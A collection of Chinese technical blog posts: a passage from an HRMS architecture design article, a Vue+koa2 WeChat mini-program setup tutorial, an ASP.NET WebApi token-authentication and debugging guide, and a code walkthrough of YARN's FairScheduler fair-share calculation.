薪酬福利：工资管理系统适用于各类企业、行政、事业及科研单位，直接集成考勤、绩效考核等数据，主要提供工资核算、工资发放、经费计提、统计分析等功能。支持工资的多次或分次发放；支持代扣税或代缴税；工资发放支持银行代发，提供代发数据的输出功能，同时也支持现金发放，提供分钱清单功能。经费计提的内容和计提的比率可以进行设置；福利管理系统提供员工的各项福利基金的提取和管理功能。主要包括定义基金类型、设置基金提取的条件，进行基金的日常管理，并提供相应的统计分析，基金的日常管理包括基金定期提取、基金的补缴、转入转出等。此外，提供向相关管理机关报送相关报表的功能
行政管理：主要提供对员工出勤情况的管理，帮助企业完善作业制度。主要包括各种假期的设置、班别的设置、相关考勤项目的设置，以及调班、加班、公出、请假的管理、迟到早退的统计、出勤情况的统计等。提供与各类考勤机系统的接口，并为薪资管理系统提供相关数据。支持通知公告分发，支持会议室/车辆等资源预定并同步日历，支持调研和投票问卷，支持活动管理的报名/签到/统计等，支持人员的奖惩管理并与人事档案关联，支持活动的抽奖管理等
培训管理：根据岗位设置及绩效考核结果，确定必要的培训需求；为员工职业生涯发展制定培训计划；对培训的目标、课程内容、授课教师、时间、地点、设备、预算等进行管理，对培训人员、培训结果、培训费用进行管理
绩效管理：通过绩效考核可以评价人员配置和培训的效果、对员工进行奖惩激励、为人事决策提供依据。根据不同职位在知识、技能、能力、业绩等方面的要求，系统提供多种考核方法、标准，允许自由设置考核项目，对员工的特征、行为、工作结果等进行定性和定量的考评
配置管理：系统中为了增强系统的兼容性及灵活性，增加了诸多系统开关及配置，为后续满足各类场景提供支撑。其中需要有配置项的动态分类、动态增加、修改等功能
权限管理：
通用权限管理系统，支撑组织、员工、角色、菜单、按钮、数据等涵盖功能及数据全面的权限管理功能
流程管理：提供工作流引擎服务，支持自定义表单及流程，全面支撑HRMS系统中的审批流。
人力资源规划分析：提供全方位的统计分析功能，满足企业人力资源管理及规划，为后续的经营决策提供数据依据。

2)、系统边界
基于上述核心功能点，我们可以梳理出系统的边界，包含如下几个方面：

i、管理员的系统边界
       由于管理员的角色定位已经做了限定，所以他需要有专门的运维管理后台，这个后台提供的功能和业务操作人员的后台功能和界面是完全不同的，所以需要单独的入口，其中的功能模块也是有区别的。所以我们可以得出管理员使用系统时的接入方式和边界。
ii、HR的系统边界
       HR的角色承担业务管理的相关职责，诸如HR模块中的审批环节，他们既有业务发起的操作又有审批环节的操作，所以相对来说HR角色的使用边界会更广泛，相比员工来说。我们发现HR在使用时需要有单独的系统入口，并且分配给他们对应的业务模块及功能。
iii、员工的系统边界
       对于员工来说，HRMS系统中只有部分模块式可以操作使用的，诸如考勤、报销、绩效、查看及维护个人信息等，其他的信息都是由HR填写后用户可以查看，所以从操作便捷来看，员工与HR在业务系统入口上可以是统一入口，通过权限来限制访问边界即可。
iv、公司管理者的边界
        公司的管理者相比员工具有相应的业务及数据管理权限，同时会在审批流环节中承担审核者的身份，诸多业务流程都和管理者相关，所以相比员工来说，公司管理者的业务及操作权限较大，更多的上下级管理方面的业务内容较多，同时还可以完成员工角色操作的相关业务。
3)、数据对象

i、基础数据：系统包含的元数据、服务管理、日志、模块、基础配置、数据字典、系统管理等基础数据管理
ii、业务数据：涵盖机构、员工、HRMS系统业务及流程数据、外部第三方业务联动数据等
iii、其他数据：涵盖诸如文件、图片、视频等其他类型的数据；统计分析后的结果数据；与第三方系统交互或留存的数据等相关内容。其他诸如log日志等数据信息。
B、划分高层子系统

       我们基于上面鲁棒图分析后的核心需求，我们给出系统的宏观的架构轮廓，这里仅考虑用户角色及职责链、从而形成上述的高层分割。
C、质量需求影响架构的基本原理：进一步质疑
       结合前面我们已经梳理过的关键的质量及约束，具体请参考《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-下篇》，由于篇幅关系我就不详细列举，下面基于这些质量属性及约束我们来进一步完善概要架构：
1)、考虑关键质量属性中的持续可用性及可伸缩性，得出概要架构的中间成果：

2)、考虑关键质量属性中的互操作性，进一步优化概要架构的中间成果：

3)、考虑高性能，除了高负载，还需要考虑静态化、缓存等提升系统性能：

       上面基本形成了一个概要架构的雏形，不过这还不够，我们还有一项关键的内容没有分析，那就是系统约束，我们需要将之前明确的关键约束进行分析拆解，转化为功能或质量要求：
D、分析约束影响架构的基本原理：直接制约、转化为功能或质量需求

分析上述表格的内容，结合上几轮分析后给出的概要架构进行验证，看看这些约束会不会影响该架构内容，然后进行优化调整：

i、业务环境及约束：目前来看，上述概要架构可以支持,不会对于当前的概要架构造成影响。
ii、使用环境约束：之前拟定的PC、App端访问模式已考虑了上述的场景，关于多语言在应用层细节设计时考虑即可。
iii、开发环境约束：概要架构还不涉及细节内容，当前的约束也不会对于架构产生较大影响
iv、技术环境约束：无影响，属于细节层面

E、基于上面几部走，我们得到了初步的概要架构，基本上符合功能、质量及约束的各类要求及场景，得出以下概要架构设计图。

四、概要架构阶段要点总结
基于前面对于概要架构设计推演过程的实践，我们总结概要架构过程的3个核心要点内容如下：
1、首先，需要分析找到HRMS系统中的关键功能、质量及约束
2、其次，利用鲁棒图找到系统的用户、关键功能及职责链，形成初步的子系统的拆分、过程中借助高层分割形成分层结构，不断通过质疑+解决方案的模式，应对及完善质量及约束的要求。
3、最后，通过1、2步实践过程，最终推导出初步的概要架构，为下一步的细化架构提供基础。
希望大家通过上面示例的展示，为大家后续在系统架构设计实践的过程中提供一些帮助。
五、更多信息
关于更多的系统架构方面的知识，我已建立了交流群，相关资料会第一时间在群里分享，欢迎大家入群互相学习交流：
微信群：（扫码入群-名额有限）

********************************************************************************************************************************************************************************************************
Vue+koa2开发一款全栈小程序(5.服务端环境搭建和项目初始化）
1.微信公众平台小程序关联腾讯云
腾讯云的开发环境是给免费的一个后台，但是只能够用于开发，如果用于生产是需要花钱的，我们先用开发环境吧
1.用小程序开发邮箱账号登录微信公众平台
2.【设置】→【开发者工具】→第一次是git管理，开启腾讯云关联
3.会一路跳转到腾讯云的【开通开发环境】的流程要走

1.已经完成
2.下载安装微信开发者工具，也已经下载安装了
3.下载Node.js版本Demo
将demo中的server文件夹，复制到mpvue项目中
在项目下的project.config.json中，增加代码：

"qcloudRoot":"/server/",


 在server文件夹下的config.js中，在pass后填写Appid

 
 
 然后在微信开发者工具中，打开项目，点击右上角的【腾讯云】→【上传测试代码】
首次上传选【模块上传】，然后如图把相应的地方勾选，以后就选智能上传就可以了。

 2.搭建本地环境
1.安装MySQL数据库
2.配置本地server文件夹下的config.js，加入配置代码

    serverHost: 'localhost',
    tunnelServerUrl: '',
    tunnelSignatureKey: '27fb7d1c161b7ca52d73cce0f1d833f9f5b5ec89',
      // 腾讯云相关配置可以查看云 API 秘钥控制台：https://console.cloud.tencent.com/capi
    qcloudAppId: '你的appid',
    qcloudSecretId: '你的云api秘钥id',
    qcloudSecretKey: '你的云api秘钥key',
    wxMessageToken: 'weixinmsgtoken',
    networkTimeout: 30000,


 
 

获取云api秘钥id和key地址：https://console.cloud.tencent.com/capi


获取appid的地址：https://console.cloud.tencent.com/developer

 
 3.新建cAuth数据库
打开MySQL控制台，执行命令

create database cAuth;

 数据库名cAuth，是与server项目中保持一致。
如果本地的MySQL设置了密码，将server文件下的config.js中的数据库密码配置，填写你mysql数据库的密码

 
4.启动server服务端
打开cmd，cd到server项目目录下，执行

cnpm install

 

cnpm install -g nodemon

5.测试一下本地环境是否搭建好了
在server项目下controllers目录下，新建demo.js文件

module.exports=async(ctx)=>{
    ctx.state.data={
        msg:'hello 小程序后台'
    }
}

在server项目目录下的router目录下的index.js中添加路由

router.get('/demo',controllers.demo)


 
 然后执行运行server项目的命令

npm run dev //启动server项目

浏览器访问

http://localhost:5757/weapp/demo

.
 
 
 
3.项目初始化
1.新建mpvue项目 打开cmd，cd到想要存放项目的目录下

cnpm install -g vue-cli   //安装脚手架
vue init mpvue/mpvue-quickstart mydemo
Project name mydemo
wxmp appid //登录微信小程序后台，找到appid
//然后全都默认即可

cd mydemo
cnpm install
npm run dev//启动新建的mpvue项目

2.用vscode打开mydemo项目
1.将图片素材库文件夹img复制到mydemo/static目录下
2.在src目录下，新建me目录，目录下新建mian.js和index.vue
main.js代码

import Vue from 'vue'
import App from './index'

const app = new Vue(App)
app.$mount()

index.vue

<template>
    <div>
        个人中心页面
    </div>
</template>
<script>
export default {
    

}
</script>
<style>
    
</style>

3.在src目录下，新建books目录，目录下新建mian.js和index.vue
main.js代码

import Vue from 'vue'
import App from './index'

const app = new Vue(App)
app.$mount()

index.vue代码

<template>
    <div>
        图书页面
    </div>
</template>
<script>
export default {
    

}
</script>
<style>
    
</style>

4.在src目录下，新建comments目录，目录下新建mian.js和index.vue
main.js代码

import Vue from 'vue'
import App from './index'

const app = new Vue(App)
app.$mount()

index.vue代码

<template>
    <div>
        评论过的书页面
    </div>
</template>
<script>
export default {
    

}
</script>
<style>
    
</style>

嗯，是的，3，4，5步骤中，main.js 的代码是一样的，index.vue代码基本一样
5.防止代码格式报错导致项目无法启动，先到项目目录下的build目录下的webpack.base.conf.js中，将一段配置代码注释掉

6.在mydemo项目下的app.json中修改添加配置代码
app.json代码

{
  "pages": [
    "pages/books/main", //将哪个页面路径放第一个，哪个页面就是首页，加^根本不好使，而且还报错
    "pages/comments/main",
    "pages/me/main",
    "pages/index/main",
    "pages/logs/main",
    "pages/counter/main"
  ],
  "window": {
    "backgroundTextStyle": "light",
    "navigationBarBackgroundColor": "#EA5149",
    "navigationBarTitleText": "蜗牛图书",
    "navigationBarTextStyle": "light"
  }

  
}

7.在cmd中重启mydemo项目，在微信开发者工具中打开

 
 3.底部导航
1.微信公众平台小程序全局配置文档地址

https://developers.weixin.qq.com/miniprogram/dev/framework/config.html#全局配置

2.根据官方文档，在app.json填写底部导航配置代码

{
  "pages": [
    "pages/books/main",
    "pages/comments/main",
    "pages/me/main",
    "pages/index/main",
    "pages/logs/main",
    "pages/counter/main"
  ],
  "window": {
    "backgroundTextStyle": "light",
    "navigationBarBackgroundColor": "#EA5149",
    "navigationBarTitleText": "蜗牛图书",
    "navigationBarTextStyle": "light"
  },
  "tabBar": {
    "selectedColor":"#EA5149",
    "list": [{

      "pagePath": "pages/books/main",
      "text": "图书",
      "iconPath":"static/img/book.png",
      "selectedIconPath":"static/img/book-active.png"
    },
    {

      "pagePath": "pages/comments/main",
      "text": "评论",
      "iconPath":"static/img/todo.png",
      "selectedIconPath":"static/img/todo-active.png"
    },
    {

      "pagePath": "pages/me/main",
      "text": "我",
      "iconPath":"static/img/me.png",
      "selectedIconPath":"static/img/me-active.png"
    }
  ]
  }

  
}

3.效果图

 
 4.代码封装
 1.打开cmd，cd到server下，运行后端

npm run dev

2.在mydemo/src 目录下，新建config.js

//配置项

const host="http://localhost:5757"

const config={
    host
}
export default config

3.在src目录下新建until.js

//工具函数

import config from './config'

export function get(url){
    return new Promise((reslove,reject)=>{
        wx.request({
            url:config.host+url,
            success:function(res){
                if(res.data.code===0){
                    reslove(res.data.data)
                }else{
                    reject(res.data)
                }
            }
        })
    })
}

4.App.vue中添加代码

<script>
import {get} from './until'

export default {
  async created () {
    // 调用API从本地缓存中获取数据
    const logs = wx.getStorageSync('logs') || []
    logs.unshift(Date.now())
    wx.setStorageSync('logs', logs)

    const res=await get('/weapp/demo')
    console.log(123,res)
    console.log('小程序启动了')
  }
}
</script>

<style>
.container {
  height: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: space-between;
  padding: 200rpx 0;
  box-sizing: border-box;
}
/* this rule will be remove */
* {
  transition: width 2s;
  -moz-transition: width 2s;
  -webkit-transition: width 2s;
  -o-transition: width 2s;
}
</style>


5.在微信开发者工具中，在右上角点击【详情】，勾选不校验合法域名

6.运行mydemo

npm run dev


 
 5.使用ESLint自动规范代码
1.将mydemo/build/webpck.base.conf.js中之前注释的代码恢复

2.在mydemo项目下的package.json中的“lint”配置中加入--fix

3.执行代码，规范代码

npm run lint//如果一般的格式错误，就会自动修改，如果有代码上的错误，则会报出位置错误

4.执行运行代码

npm run dev

发现已经不报错啦！
********************************************************************************************************************************************************************************************************
ASP.NET MVC5+EF6+EasyUI 后台管理系统-WebApi的用法与调试
1：ASP.NET MVC5+EF6+EasyUI 后台管理系统（1）-WebApi与Unity注入 使用Unity是为了使用我们后台的BLL和DAL层
2：ASP.NET MVC5+EF6+EasyUI 后台管理系统（2）-WebApi与Unity注入-配置文件
3：ASP.NET MVC5+EF6+EasyUI 后台管理系统（3）-MVC WebApi 用户验证 (1)
4：ASP.NET MVC5+EF6+EasyUI 后台管理系统（4）-MVC WebApi 用户验证 (2)

以往我们讲了WebApi的基础验证，但是有新手经常来问我使用的方式
这次我们来分析一下代码的用法，以及调试的方式
WebApi在一些场景我们会用到，比如：

1.对接各种客户端（移动设备）
2.构建常见的http微服务 
3.开放数据 
4.单点登陆  等...


本文主要演示几点：主要也是对以往的回顾整理

1.使用HelpPage文档
2.Postman对接口进行调试（之前的样例太过简单，这次加一些参数，让初学者多看到这些场景）
3.调试接口

1.HelpPage Api帮助文档
我们新建的WebApi集成了微软自带的HelpPage，即Api的文档，在我们编写好接口之后会自动生成一份文档
配置HelpPage，非常简单，分两步
设置项目属性的输出XML文档

2.打开Areas-->HelpPage-->App_Start-->HelpPageConfig.cs

    public static void Register(HttpConfiguration config)
        {
            //// Uncomment the following to use the documentation from XML documentation file.
            config.SetDocumentationProvider(new XmlDocumentationProvider(HttpContext.Current.Server.MapPath("~/bin/Apps.WebApi.XML")));

设置Register方法就行，运行地址localhost:1593/help得到如下结果

从图中可以看出，每一个控制器的接口都会列出来，并根据注释和参数生成文档，全自动
点击接口可以看到参数和请求方式

2.使用Postman调试
下载地址：https://www.getpostman.com/
Pastman非常易用，我们下面就拿登陆接口来测试

打开Postman，新建一个请求

OK，我们已经获得token！注意，新建请求的时候，要设置GET,POST
 
3.验证权限
之前的文章，我们是通过令牌的方式+接口权限来访问接口数据的
打开SupperFilter.cs过滤器代码

//url获取token
            var content = actionContext.Request.Properties[ConfigPara.MS_HttpContext] as HttpContextBase;

            var token = content.Request.QueryString[ConfigPara.Token];
            if (!string.IsNullOrEmpty(token))
            {
                //解密用户ticket,并校验用户名密码是否匹配

                //读取请求上下文中的Controller,Action,Id
                var routes = new RouteCollection();
                RouteConfig.RegisterRoutes(routes);
                RouteData routeData = routes.GetRouteData(content);
                //取出区域的控制器Action,id
                string controller = actionContext.ActionDescriptor.ControllerDescriptor.ControllerName;
                string action = actionContext.ActionDescriptor.ActionName;
                //URL路径
                string filePath = HttpContext.Current.Request.FilePath;
                //判断token是否有效
                if (!LoginUserManage.ValidateTicket(token))
                {
                    HandleUnauthorizedRequest(actionContext);
                }

                //判断是否角色组授权（如果不需要使用角色组授权可以注释掉这个方法，这样就是登录用户都可以访问所有接口）
                if (!ValiddatePermission(token, controller, action, filePath))
                {
                    HandleUnauthorizedRequest(actionContext);
                }

                //已经登录，有权限
                base.IsAuthorized(actionContext);

过滤器中会读取到用户传过来的token并进行2个逻辑验证
1.验证token是否有效
2.验证接口有没有权限（通过后台分配权限来获取Action）这个操作跟我们授权界面是一样的 
（注：如果注释掉即所有登陆用户都可以访问所有接口，不受控制，主要看业务场景吧）
 
4.通过Token向其他接口拿数据
看到SysSampleController类，这个类和普通MVC里面的样例的接口其实没有什么区别，BLL后的所有都是通用的，所以逻辑就不需要重新写了！按照第二点的获得token，配置到Postman可以获得数据

1.查询

2.创建

3.修改

4.获取明细

5.删除
 

 谢谢，从源码直接可以看出，和自己测试或者自己配置一遍，不失是一种体验

 
********************************************************************************************************************************************************************************************************
别被官方文档迷惑了！这篇文章帮你详解yarn公平调度
欢迎大家前往腾讯云+社区，获取更多腾讯海量技术实践干货哦~

本文由@edwinhzhang发表于云+社区专栏

FairScheduler是yarn常用的调度器，但是仅仅参考官方文档，有很多参数和概念文档里没有详细说明，但是这些参明显会影响到集群的正常运行。本文的主要目的是通过梳理代码将关键参数的功能理清楚。下面列出官方文档中常用的参数：



yarn.scheduler.fair.preemption.cluster-utilization-threshold
The utilization threshold after which preemption kicks in. The utilization is computed as the maximum ratio of usage to capacity among all resources. Defaults to 0.8f.




yarn.scheduler.fair.update-interval-ms
The interval at which to lock the scheduler and recalculate fair shares, recalculate demand, and check whether anything is due for preemption. Defaults to 500 ms.


maxAMShare
limit the fraction of the queue’s fair share that can be used to run application masters. This property can only be used for leaf queues. For example, if set to 1.0f, then AMs in the leaf queue can take up to 100% of both the memory and CPU fair share. The value of -1.0f will disable this feature and the amShare will not be checked. The default value is 0.5f.


minSharePreemptionTimeout
number of seconds the queue is under its minimum share before it will try to preempt containers to take resources from other queues. If not set, the queue will inherit the value from its parent queue.


fairSharePreemptionTimeout
number of seconds the queue is under its fair share threshold before it will try to preempt containers to take resources from other queues. If not set, the queue will inherit the value from its parent queue.


fairSharePreemptionThreshold
If the queue waits fairSharePreemptionTimeout without receiving fairSharePreemptionThreshold*fairShare resources, it is allowed to preempt containers to take resources from other queues. If not set, the queue will inherit the value from its parent queue.



在上述参数描述中，timeout等参数值没有给出默认值，没有告知不设置会怎样。minShare,fairShare等概念也没有说清楚，很容易让人云里雾里。关于这些参数和概念的详细解释，在下面的分析中一一给出。
FairScheduler整体结构
 图（1） FairScheduler 运行流程图
公平调度器的运行流程就是RM去启动FairScheduler,SchedulerDispatcher两个服务，这两个服务各自负责update线程，handle线程。
update线程有两个任务：（1）更新各个队列的资源（Instantaneous Fair Share）,（2）判断各个leaf队列是否需要抢占资源（如果开启抢占功能）
handle线程主要是处理一些事件响应，比如集群增加节点，队列增加APP，队列删除APP，APP更新container等。
FairScheduler类图
图（2） FairScheduler相关类图
队列继承模块：yarn通过树形结构来管理队列。从管理资源角度来看，树的根节点root队列（FSParentQueue）,非根节点（FSParentQueue），叶子节点（FSLeaf）,app任务（FSAppAttempt，公平调度器角度的App）都是抽象的资源，它们都实现了Schedulable接口，都是一个可调度资源对象。它们都有自己的fair share（队列的资源量）方法（这里又用到了fair share概念），weight属性（权重）、minShare属性（最小资源量）、maxShare属性(最大资源量)，priority属性(优先级)、resourceUsage属性（资源使用量属性）以及资源需求量属性(demand)，同时也都实现了preemptContainer抢占资源的方法，assignContainer方法（为一个ACCEPTED的APP分配AM的container）。
public interface Schedulable {
  /**
   * Name of job/queue, used for debugging as well as for breaking ties in
   * scheduling order deterministically.
   */
  public String getName();

  /**
   * Maximum number of resources required by this Schedulable. This is defined as
   * number of currently utilized resources + number of unlaunched resources (that
   * are either not yet launched or need to be speculated).
   */
  public Resource getDemand();

  /** Get the aggregate amount of resources consumed by the schedulable. */
  public Resource getResourceUsage();

  /** Minimum Resource share assigned to the schedulable. */
  public Resource getMinShare();

  /** Maximum Resource share assigned to the schedulable. */
  public Resource getMaxShare();

  /** Job/queue weight in fair sharing. */
  public ResourceWeights getWeights();

  /** Start time for jobs in FIFO queues; meaningless for QueueSchedulables.*/
  public long getStartTime();

 /** Job priority for jobs in FIFO queues; meaningless for QueueSchedulables. */
  public Priority getPriority();

  /** Refresh the Schedulable's demand and those of its children if any. */
  public void updateDemand();

  /**
   * Assign a container on this node if possible, and return the amount of
   * resources assigned.
   */
  public Resource assignContainer(FSSchedulerNode node);

  /**
   * Preempt a container from this Schedulable if possible.
   */
  public RMContainer preemptContainer();

  /** Get the fair share assigned to this Schedulable. */
  public Resource getFairShare();

  /** Assign a fair share to this Schedulable. */
  public void setFairShare(Resource fairShare);
}
队列运行模块：从类图角度描述公平调度的工作原理。SchedulerEventDispatcher类负责管理handle线程。FairScheduler类管理update线程，通过QueueManager获取所有队列信息。
我们从Instantaneous Fair Share 和Steady Fair Share 这两个yarn的基本概念开始进行代码分析。
Instantaneous Fair Share & Steady Fair Share
Fair Share指的都是Yarn根据每个队列的权重、最大，最小可运行资源计算的得到的可以分配给这个队列的最大可用资源。本文描述的是公平调度，公平调度的默认策略FairSharePolicy的规则是single-resource，即只关注内存资源这一项指标。
Steady Fair Share：是每个队列内存资源量的固定理论值。Steady Fair Share在RM初期工作后不再轻易改变，只有后续在增加节点（addNode）时才会重新计算。RM的初期工作也是handle线程把集群的每个节点添加到调度器中（addNode）。
Instantaneous Fair Share：是每个队列的内存资源量的实际值，是在动态变化的。yarn里的fair share如果没有专门指代，都是指的的Instantaneous Fair Share。
1 Steady Fair Share计算方式
 图（3） steady fair share 计算流程
handle线程如果接收到NODE_ADDED事件，会去调用addNode方法。
  private synchronized void addNode(RMNode node) {
    FSSchedulerNode schedulerNode = new FSSchedulerNode(node, usePortForNodeName);
    nodes.put(node.getNodeID(), schedulerNode);
    //将该节点的内存加入到集群总资源
    Resources.addTo(clusterResource, schedulerNode.getTotalResource());
    //更新available资源
    updateRootQueueMetrics();
    //更新一个container的最大分配，就是UI界面里的MAX（如果没有记错的话）
    updateMaximumAllocation(schedulerNode, true);

    //设置root队列的steadyFailr=clusterResource的总资源
    queueMgr.getRootQueue().setSteadyFairShare(clusterResource);
    //重新计算SteadyShares
    queueMgr.getRootQueue().recomputeSteadyShares();
    LOG.info("Added node " + node.getNodeAddress() +
        " cluster capacity: " + clusterResource);
  }
recomputeSteadyShares 使用广度优先遍历计算每个队列的内存资源量，直到叶子节点。
 public void recomputeSteadyShares() {
    //广度遍历整个队列树
    //此时getSteadyFairShare 为clusterResource
    policy.computeSteadyShares(childQueues, getSteadyFairShare());
    for (FSQueue childQueue : childQueues) {
      childQueue.getMetrics().setSteadyFairShare(childQueue.getSteadyFairShare());
      if (childQueue instanceof FSParentQueue) {
        ((FSParentQueue) childQueue).recomputeSteadyShares();
      }
    }
  }
computeSteadyShares方法计算每个队列应该分配到的内存资源，总体来说是根据每个队列的权重值去分配，权重大的队列分配到的资源更多，权重小的队列分配到得资源少。但是实际的细节还会受到其他因素影响，是因为每队列有minResources和maxResources两个参数来限制资源的上下限。computeSteadyShares最终去调用computeSharesInternal方法。比如以下图为例：
图中的数字是权重，假如有600G的总资源，parent=300G,leaf1=300G,leaf2=210G,leaf3=70G。
图（4） yarn队列权重
computeSharesInternal方法概括来说就是通过二分查找法寻找到一个资源比重值R（weight-to-slots），使用这个R为每个队列分配资源（在该方法里队列的类型是Schedulable,再次说明队列是一个资源对象），公式是steadyFairShare=R * QueueWeights。
computeSharesInternal是计算Steady Fair Share 和Instantaneous Fair Share共用的方法，根据参数isSteadyShare来区别计算。
之所以要做的这么复杂，是因为队列不是单纯的按照比例来分配资源的（单纯按权重比例，需要maxR,minR都不设置。maxR的默认值是0x7fffffff，minR默认值是0）。如果设置了maxR,minR,按比例分到的资源小于minR,那么必须满足minR。按比例分到的资源大于maxR，那么必须满足maxR。因此想要找到一个R（weight-to-slots）来尽可能满足：

R*（Queue1Weights + Queue2Weights+...+QueueNWeights） <=totalResource
R*QueueWeights >= minShare
R*QueueWeights <= maxShare

注：QueueNWeights为队列各自的权重，minShare和maxShare即各个队列的minResources和maxResources
computcomputeSharesInternal详细来说分为四个步骤：

确定可用资源：totalResources = min(totalResources-takenResources(fixedShare), totalMaxShare)
确定R上下限
二分查找法逼近R
使用R设置fair Share

  private static void computeSharesInternal(
      Collection<? extends Schedulable> allSchedulables,
      Resource totalResources, ResourceType type, boolean isSteadyShare) {

    Collection<Schedulable> schedulables = new ArrayList<Schedulable>();
    //第一步
    //排除有固定资源不能动的队列,并得出固定内存资源
    int takenResources = handleFixedFairShares(
        allSchedulables, schedulables, isSteadyShare, type);

    if (schedulables.isEmpty()) {
      return;
    }
    // Find an upper bound on R that we can use in our binary search. We start
    // at R = 1 and double it until we have either used all the resources or we
    // have met all Schedulables' max shares.
    int totalMaxShare = 0;
    //遍历schedulables（非固定fixed队列），将各个队列的资源相加得到totalMaxShare
    for (Schedulable sched : schedulables) {
      int maxShare = getResourceValue(sched.getMaxShare(), type);
      totalMaxShare = (int) Math.min((long)maxShare + (long)totalMaxShare,
          Integer.MAX_VALUE);
      if (totalMaxShare == Integer.MAX_VALUE) {
        break;
      }
    }
    //总资源要减去fiexd share
    int totalResource = Math.max((getResourceValue(totalResources, type) -
        takenResources), 0);
    //队列所拥有的最大资源是有集群总资源和每个队列的MaxResource双重限制
    totalResource = Math.min(totalMaxShare, totalResource);
    //第二步:设置R的上下限
    double rMax = 1.0;
    while (resourceUsedWithWeightToResourceRatio(rMax, schedulables, type)
        < totalResource) {
      rMax *= 2.0;
    }

    //第三步：二分法逼近合理R值
    // Perform the binary search for up to COMPUTE_FAIR_SHARES_ITERATIONS steps
    double left = 0;
    double right = rMax;
    for (int i = 0; i < COMPUTE_FAIR_SHARES_ITERATIONS; i++) {
      double mid = (left + right) / 2.0;
      int plannedResourceUsed = resourceUsedWithWeightToResourceRatio(
          mid, schedulables, type);
      if (plannedResourceUsed == totalResource) {
        right = mid;
        break;
      } else if (plannedResourceUsed < totalResource) {
        left = mid;
      } else {
        right = mid;
      }
    }
    //第四步：使用R值设置，确定各个非fixed队列的fairShar,意味着只有活跃队列可以分资源
    // Set the fair shares based on the value of R we've converged to
    for (Schedulable sched : schedulables) {
      if (isSteadyShare) {
        setResourceValue(computeShare(sched, right, type),
            ((FSQueue) sched).getSteadyFairShare(), type);
      } else {
        setResourceValue(
            computeShare(sched, right, type), sched.getFairShare(), type);
      }
    }
  }
(1) 确定可用资源
handleFixedFairShares方法来统计出所有fixed队列的fixed内存资源（fixedShare）相加，并且fixed队列排除掉不得瓜分系统资源。yarn确定fixed队列的标准如下：
  private static int getFairShareIfFixed(Schedulable sched,
      boolean isSteadyShare, ResourceType type) {

    //如果队列的maxShare <=0  则是fixed队列，fixdShare=0
    if (getResourceValue(sched.getMaxShare(), type) <= 0) {
      return 0;
    }

    //如果是计算Instantaneous Fair Share,并且该队列内没有APP再跑，
    // 则是fixed队列，fixdShare=0
    if (!isSteadyShare &&
        (sched instanceof FSQueue) && !((FSQueue)sched).isActive()) {
      return 0;
    }

    //如果队列weight<=0,则是fixed队列
    //如果对列minShare <=0,fixdShare=0,否则fixdShare=minShare
    if (sched.getWeights().getWeight(type) <= 0) {
      int minShare = getResourceValue(sched.getMinShare(), type);
      return (minShare <= 0) ? 0 : minShare;
    }

    return -1;
  }
(2)确定R上下限
R的下限为1.0，R的上限是由resourceUsedWithWeightToResourceRatio方法来确定。该方法确定的资源值W，第一步中确定的可用资源值T：W>=T时，R才能确定。
//根据R值去计算每个队列应该分配的资源
  private static int resourceUsedWithWeightToResourceRatio(double w2rRatio,
      Collection<? extends Schedulable> schedulables, ResourceType type) {
    int resourcesTaken = 0;
    for (Schedulable sched : schedulables) {
      int share = computeShare(sched, w2rRatio, type);
      resourcesTaken += share;
    }
    return resourcesTaken;
  }
 private static int computeShare(Schedulable sched, double w2rRatio,
      ResourceType type) {
    //share=R*weight,type是内存
    double share = sched.getWeights().getWeight(type) * w2rRatio;
    share = Math.max(share, getResourceValue(sched.getMinShare(), type));
    share = Math.min(share, getResourceValue(sched.getMaxShare(), type));
    return (int) share;
  }
（3）二分查找法逼近R
满足下面两个条件中的一个即可终止二分查找：

W == T(步骤2中的W和T)
超过25次（COMPUTE_FAIR_SHARES_ITERATIONS）

（4）使用R设置fair share
设置fair share时，可以看到区分了Steady Fair Share 和Instantaneous Fair Share。
  for (Schedulable sched : schedulables) {
      if (isSteadyShare) {
        setResourceValue(computeShare(sched, right, type),
            ((FSQueue) sched).getSteadyFairShare(), type);
      } else {
        setResourceValue(
            computeShare(sched, right, type), sched.getFairShare(), type);
      }
    }
2 Instaneous Fair Share计算方式
图（5）Instaneous Fair Share 计算流程
该计算方式与steady fair的计算调用栈是一致的，最终都要使用到computeSharesInternal方法，唯一不同的是计算的时机不一样。steady fair只有在addNode的时候才会重新计算一次，而Instantaneous Fair Share是由update线程定期去更新。
此处强调的一点是，在上文中我们已经分析如果是计算Instantaneous Fair Share，并且队列为空，那么该队列就是fixed队列，也就是非活跃队列，那么计算fair share时，该队列是不会去瓜分集群的内存资源。
而update线程的更新频率就是由 yarn.scheduler.fair.update-interval-ms来决定的。
private class UpdateThread extends Thread {

    @Override
    public void run() {
      while (!Thread.currentThread().isInterrupted()) {
        try {
          //yarn.scheduler.fair.update-interval-ms
          Thread.sleep(updateInterval);
          long start = getClock().getTime();
          // 更新Instantaneous Fair Share
          update();
          //抢占资源
          preemptTasksIfNecessary();
          long duration = getClock().getTime() - start;
          fsOpDurations.addUpdateThreadRunDuration(duration);
        } catch (InterruptedException ie) {
          LOG.warn("Update thread interrupted. Exiting.");
          return;
        } catch (Exception e) {
          LOG.error("Exception in fair scheduler UpdateThread", e);
        }
      }
    }
  }
3 maxAMShare意义
handle线程如果接收到NODE_UPDATE事件，如果（1）该node的机器内存资源满足条件，（2）并且有ACCEPTED状态的Application，那么将会为该待运行的APP的AM分配一个container，使该APP在所处的queue中跑起来。但在分配之前还需要一道检查canRuunAppAM。能否通过canRuunAppAM,就是由maxAMShare参数限制。
  public boolean canRunAppAM(Resource amResource) {
    //默认是0.5f
    float maxAMShare =
        scheduler.getAllocationConfiguration().getQueueMaxAMShare(getName());
    if (Math.abs(maxAMShare - -1.0f) < 0.0001) {
      return true;
    }
    //该队的maxAMResource=maxAMShare * fair share(Instantaneous Fair Share)
    Resource maxAMResource = Resources.multiply(getFairShare(), maxAMShare);
    //amResourceUsage是该队列已经在运行的App的AM所占资源累加和
    Resource ifRunAMResource = Resources.add(amResourceUsage, amResource);
    //查看当前ifRunAMResource是否超过maxAMResource
    return !policy
        .checkIfAMResourceUsageOverLimit(ifRunAMResource, maxAMResource);
  }
上面代码我们用公式来描述：

队列中运行的APP为An，每个APP的AM占用资源为R
ACCEPTED状态（待运行）的APP的AM大小为R1
队列的fair share为QueFS
队列的maxAMResource=maxAMShare * QueFS
ifRunAMResource=A1.R+A2.R+...+An.R+R1
ifRunAMResource > maxAMResource，则该队列不能接纳待运行的APP

